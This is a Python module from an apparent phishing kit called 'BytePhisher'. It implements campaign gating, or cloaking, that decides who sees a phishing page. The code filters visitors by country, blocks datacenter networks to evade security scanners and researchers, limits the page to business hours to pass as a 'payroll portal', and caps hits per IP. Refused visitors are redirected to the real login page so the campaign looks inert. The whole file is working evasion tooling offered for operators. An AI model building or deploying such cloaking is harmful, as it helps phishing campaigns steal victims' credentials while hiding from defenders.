# BytePhisher — campaign gating.
#
# Real campaigns get hammered by scanners, researchers and VPN traffic. Gating
# lets an operator decide *who* even sees the page, and it records every refusal
# so reporting stays honest ("412 visits, 37 served"):
#
#   * country allow/deny list
#   * datacenter / hosting ASN refusal (kills most automated scanning)
#   * active hours / weekdays (a "payroll portal" that only exists Mon-Fri 9-6)
#   * per-IP hit cap (sliding window)
#
# A refused visitor is sent to the decoy URL (normally the real login page) so
# the campaign looks inert instead of obviously malicious.
import time

from . import classify

DATACENTER_MARKERS = classify.DATACENTER_MARKERS

WEEKDAYS = {"mon": 0, "tue": 1, "wed": 2, "thu": 3, "fri": 4, "sat": 5, "sun": 6}


def parse_days(value):
    """'mon,fri,sat' or 'mon-fri' -> set of weekday ints."""
    if not value:
        return None
    out = set()
    for raw in str(value).split(","):
        part = raw.strip().lower()
        if not part:
            continue
        if "-" in part:
            # NB: split the range BEFORE truncating to 3 chars, otherwise
            # "fri-mon" becomes "fri" and the range is silently lost
            a, _, b = part.partition("-")
            a, b = a.strip()[:3], b.strip()[:3]
            if a in WEEKDAYS and b in WEEKDAYS:
                start, end = WEEKDAYS[a], WEEKDAYS[b]
                if start <= end:
                    out.update(range(start, end + 1))
                else:  # wrap-around like fri-mon
                    out.update(list(range(start, 7)) + list(range(0, end + 1)))
        elif part[:3] in WEEKDAYS:
            out.add(WEEKDAYS[part[:3]])
    return out or None


def parse_hours(value):
    """'9-18' or '9:30-17:45' -> (start, end) in minutes.

    Raises ValueError on anything degenerate or unparseable: silently returning
    None used to disable the time gate entirely, so an operator who typed
    '--active-hours 9-9' believed a restriction was in force when it was not.
    """
    if not value:
        return None

    def to_min(tok, allow_end=False):
        tok = tok.strip()
        if ":" in tok:
            h, _, m = tok.partition(":")
            h, m = int(h), int(m)
        else:
            h, m = int(tok), 0
        # 24:00 is a legitimate "end of day" sentinel ("--active-hours 0-24")
        if allow_end and h == 24 and m == 0:
            return 1440
        if not (0 <= h <= 23 and 0 <= m <= 59):
            raise ValueError(f"hour out of range: {tok}")
        return h * 60 + m

    try:
        a, _, b = str(value).partition("-")
        start, end = to_min(a), to_min(b, allow_end=True)
    except Exception as e:
        raise ValueError(f"bad --active-hours '{value}' (use 9-18 or 9:30-17:45)") from e
    if start == end:
        raise ValueError(f"--active-hours '{value}' is empty (start == end) — "
                         f"remove the flag or widen the window")
    if start > end:
        raise ValueError(f"--active-hours '{value}' is inverted (start > end)")
    return (start, end)


class Gate:
    """Decides whether a visitor is served. Pure logic + an in-memory hit window,
    so it is cheap enough to run on every request."""

    def __init__(self, allow_countries=None, block_countries=None,
                 block_datacenter=False, active_hours=None, active_days=None,
                 max_hits_per_ip=0, window_seconds=3600):
        self.allow = {c.strip().upper() for c in (allow_countries or []) if c.strip()}
        self.block = {c.strip().upper() for c in (block_countries or []) if c.strip()}
        self.block_datacenter = bool(block_datacenter)
        self.hours = parse_hours(active_hours) if not isinstance(active_hours, tuple) else active_hours
        self.days = parse_days(active_days) if not isinstance(active_days, (set, frozenset)) else active_days
        self.max_hits = int(max_hits_per_ip or 0)
        self.window = int(window_seconds)
        self._hits = {}          # ip -> [timestamps]

    @property
    def enabled(self):
        return bool(self.allow or self.block or self.block_datacenter
                    or self.hours or self.days or self.max_hits)

    @property
    def needs_geo(self):
        """Only country/ISP rules require a (network) geo lookup per visitor."""
        return bool(self.allow or self.block or self.block_datacenter)

    # ---- decisions ----
    def check(self, ip=None, country=None, isp=None, now=None):
        """Return (allowed, reason). `reason` is empty when allowed.

        Failure semantics, on purpose:
          * an *allow list* blocks when there is no geo data (nothing proves the
            visitor belongs to an allowed country) — fail closed;
          * the *datacenter filter* serves when there is no ISP data (nothing
            proves it is a datacenter) — fail open, so a geo outage cannot take
            the campaign dark.
        """
        now = now if now is not None else time.time()
        if self.allow:
            if (country or "").strip().upper() not in self.allow:
                return False, f"country {country or 'unknown'} not in allow list"
        if self.block and (country or "").strip().upper() in self.block:
            return False, f"country {country} is blocked"
        if self.block_datacenter and self._is_datacenter(isp):
            return False, f"datacenter network ({isp})"
        if self.days is not None:
            if time.localtime(now).tm_wday not in self.days:
                return False, "outside active weekdays"
        if self.hours is not None:
            start, end = self.hours                      # minutes since midnight
            lt = time.localtime(now)
            cur = lt.tm_hour * 60 + lt.tm_min
            if not (start <= cur < end):
                def hhmm(m):
                    return f"{m // 60:02d}:{m % 60:02d}"
                return False, f"outside active hours ({hhmm(start)}-{hhmm(end)})"
        if self.max_hits:
            if self.hits(ip, now) >= self.max_hits:
                return False, f"hit cap reached ({self.max_hits} per {self.window}s)"
        return True, ""

    @staticmethod
    def _is_datacenter(isp):
        """One rule for the whole tool (core/classify.py)."""
        return classify.is_datacenter(isp)

    # ---- hit window ----
    def note_hit(self, ip, now=None):
        now = now if now is not None else time.time()
        if not ip:
            return
        bucket = self._hits.setdefault(ip, [])
        bucket.append(now)
        cutoff = now - self.window
        self._hits[ip] = [t for t in bucket if t >= cutoff]

    def hits(self, ip, now=None):
        now = now if now is not None else time.time()
        cutoff = now - self.window
        return len([t for t in self._hits.get(ip, []) if t >= cutoff])

    @staticmethod
    def _hhmm(m):
        return f"{m // 60:02d}:{m % 60:02d}"

    def describe(self):
        bits = []
        if self.allow:
            bits.append("allow " + ",".join(sorted(self.allow)))
        if self.block:
            bits.append("block " + ",".join(sorted(self.block)))
        if self.block_datacenter:
            bits.append("no-datacenter")
        if self.days is not None:
            bits.append("days " + ",".join(sorted(WEEKDAYS, key=WEEKDAYS.get) and
                                             [k for k, v in sorted(WEEKDAYS.items(), key=lambda kv: kv[1]) if v in self.days]))
        if self.hours:
            bits.append(f"hours {self._hhmm(self.hours[0])}-{self._hhmm(self.hours[1])}")
        if self.max_hits:
            bits.append(f"cap {self.max_hits}/{self.window}s")
        return " | ".join(bits) if bits else "off"
